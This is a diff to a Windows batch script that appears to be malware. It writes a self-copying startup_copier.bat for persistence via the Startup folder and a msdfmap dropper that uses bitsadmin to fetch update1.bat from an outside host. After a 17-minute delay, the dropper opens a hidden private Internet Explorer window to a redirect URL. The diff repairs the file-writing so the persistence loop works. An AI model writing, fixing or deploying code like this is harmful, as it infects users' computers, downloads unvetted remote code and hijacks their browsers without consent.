@@ -105,14 +105,14 @@ ECHO wscript.exe C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs C:\Us
 
 
 type NUL > C:\Users\%username%\Downloads\startup_copier.bat
-ECHO :loop22 > C:\Users\%username%\Downloads\startup_copier.bat
-ECHO IF EXIST "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat" (  > C:\Users\%username%\Downloads\startup_copier.bat
-ECHO copy /y "C:\Users\%username%\Downloads\startup_copier.bat" "C:\Users\%username%\AppData\Local" > C:\Users\%username%\Downloads\startup_copier.bat
-ECHO ) > C:\Users\%username%\Downloads\startup_copier.bat
-ECHO ELSE( > C:\Users\%username%\Downloads\startup_copier.bat
-ECHO ECHO hello > C:\Users\%username%\Downloads\startup_copier.bat
-ECHO ) > C:\Users\%username%\Downloads\startup_copier.bat
-ECHO goto loop22 > C:\Users\%username%\Downloads\startup_copier.bat
+ECHO :loop22 >> C:\Users\%username%\Downloads\startup_copier.bat
+ECHO IF EXIST "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat" (  >> C:\Users\%username%\Downloads\startup_copier.bat
+ECHO copy /y "C:\Users\%username%\Downloads\startup_copier.bat" "C:\Users\%username%\AppData\Local" >> C:\Users\%username%\Downloads\startup_copier.bat
+ECHO ) >> C:\Users\%username%\Downloads\startup_copier.bat
+ECHO ELSE( >> C:\Users\%username%\Downloads\startup_copier.bat
+ECHO ECHO hello >> C:\Users\%username%\Downloads\startup_copier.bat
+ECHO ) >> C:\Users\%username%\Downloads\startup_copier.bat
+ECHO goto loop22 >> C:\Users\%username%\Downloads\startup_copier.bat
 
 
 
@@ -138,8 +138,6 @@ ECHO     echo "it's here!" >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO ) ELSE ( >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO     bitsadmin /transfer n /download /priority normal "http://androidfriends.onlinewebshop.net/update1.bat" "C:\Users\%username%\Downloads\update1.bat" >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO ) >> C:\Users\%username%\Downloads\msdfmap.bat
-REM Starts the Startup_Copier.bat script.
-ECHO start C:\Users\%username%\AppData\Roaming\System32\startup_copier.bat >> C:\Users\%username%\Downloads\msdfmap.bat
 REM Wait 17 mins, then launch internet. 
 ECHO ping -n 1020 127.0.0.1 > nul >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO start /min iexplore -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
